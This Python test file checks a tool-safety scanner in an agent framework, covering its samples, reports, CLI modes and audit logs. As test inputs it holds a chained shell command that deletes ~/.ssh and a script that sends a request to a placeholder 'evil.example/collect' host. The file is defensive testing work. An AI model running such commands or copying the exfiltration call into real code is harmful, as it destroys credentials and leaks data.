# Tencent is pleased to support the open source community by making tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under Apache-2.0.

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import yaml

REPO_ROOT = Path(__file__).resolve().parents[3]
EXAMPLE_DIR = REPO_ROOT / "examples" / "tool_safety_guard"
POLICY_PATH = EXAMPLE_DIR / "tool_safety_policy.yaml"
SAMPLES_PATH = EXAMPLE_DIR / "samples.yaml"
REPORT_PATH = EXAMPLE_DIR / "tool_safety_report.json"
AUDIT_PATH = EXAMPLE_DIR / "tool_safety_audit.jsonl"
EXAMPLE_SCRIPT = EXAMPLE_DIR / "run_safety_scan.py"
CLI_SCRIPT = REPO_ROOT / "scripts" / "tool_safety_check.py"


def _run_command(args: list[str]) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [sys.executable, *args],
        cwd=REPO_ROOT,
        check=False,
        text=True,
        capture_output=True,
    )


def _load_report(path: Path = REPORT_PATH) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


def _assert_audit_does_not_contain_source_or_secret(audit_text: str) -> None:
    assert "rm -rf" not in audit_text
    assert "requests.get" not in audit_text
    assert "OPENAI_API_KEY" not in audit_text
    assert "suspicious-package" not in audit_text
    assert "secret-token-value" not in audit_text


def test_samples_yaml_contains_twelve_unique_samples_and_shell_injection():
    samples = yaml.safe_load(SAMPLES_PATH.read_text(encoding="utf-8"))

    assert isinstance(samples, list)
    assert len(samples) == 12
    sample_ids = [sample["id"] for sample in samples]
    assert len(sample_ids) == len(set(sample_ids))
    shell_injection = next(sample for sample in samples if sample["id"] == "shell_injection")
    assert shell_injection["command"] == 'echo "hello"; rm -rf ~/.ssh'
    assert shell_injection["expected_decision"] == "deny"
    assert shell_injection["expected_rules"] == [
        "PROC_SHELL_PIPE_OR_CHAIN",
        "FILE_RECURSIVE_DELETE",
        "FILE_SENSITIVE_READ",
    ]


def test_example_script_generates_matching_report_and_audit():
    result = _run_command([str(EXAMPLE_SCRIPT)])

    assert result.returncode == 0, result.stderr
    report = _load_report()
    assert report["policy_name"] == "example-tool-safety-policy"
    assert report["generated_at"] == "2026-07-04T00:00:00Z"
    assert report["sample_count"] == 12
    assert report["decision_summary"] == {
        "allow": 2,
        "deny": 5,
        "needs_human_review": 5,
    }
    assert all(item["match"] is True for item in report["results"])
    assert len(AUDIT_PATH.read_text(encoding="utf-8").splitlines()) == 12


def test_report_schema_contains_findings_with_evidence_and_recommendation():
    report = _load_report()

    assert set(report) == {"policy_name", "generated_at", "sample_count", "decision_summary", "results"}
    for result in report["results"]:
        assert {"sample_id", "description", "expected_decision", "expected_rules", "match", "report"} <= set(result)
        safety_report = result["report"]
        assert {"decision", "risk_level", "findings", "elapsed_ms", "blocked", "language"} <= set(safety_report)
        for finding in safety_report["findings"]:
            assert finding["rule_id"]
            assert finding["evidence"]
            assert finding["recommendation"]


def test_cli_samples_mode_writes_report_and_audit(tmp_path):
    report_out = tmp_path / "report.json"
    audit_out = tmp_path / "audit.jsonl"

    result = _run_command([
        str(CLI_SCRIPT),
        "--samples",
        str(SAMPLES_PATH),
        "--policy",
        str(POLICY_PATH),
        "--report-out",
        str(report_out),
        "--audit-out",
        str(audit_out),
    ])

    assert result.returncode == 0, result.stderr
    report = _load_report(report_out)
    assert report["sample_count"] == 12
    assert all(item["match"] is True for item in report["results"])
    audit_text = audit_out.read_text(encoding="utf-8")
    assert len(audit_text.splitlines()) == 12
    _assert_audit_does_not_contain_source_or_secret(audit_text)


def test_cli_file_mode_scans_single_python_file(tmp_path):
    script_path = tmp_path / "network.py"
    script_path.write_text(
        'import requests\nrequests.get("https://evil.example/collect")\n',
        encoding="utf-8",
    )
    report_out = tmp_path / "file-report.json"

    result = _run_command([
        str(CLI_SCRIPT),
        "--file",
        str(script_path),
        "--language",
        "python",
        "--policy",
        str(POLICY_PATH),
        "--report-out",
        str(report_out),
    ])

    assert result.returncode == 0, result.stderr
    report = _load_report(report_out)
    assert report["sample_count"] == 1
    safety_report = report["results"][0]["report"]
    assert safety_report["decision"] == "deny"
    assert safety_report["findings"][0]["rule_id"] == "NET_NON_WHITELIST_EGRESS"


def test_audit_log_does_not_contain_full_sample_code_or_secret_values():
    _assert_audit_does_not_contain_source_or_secret(AUDIT_PATH.read_text(encoding="utf-8"))


def test_readme_covers_integration_and_limits():
    text = (EXAMPLE_DIR / "README.md").read_text(encoding="utf-8")

    assert "ToolSafetyFilter" in text
    assert "SafetyGuardedCodeExecutor" in text
    assert "--no-verify" in text
    assert "OpenTelemetry" in text
    assert "does not replace sandbox isolation" in text
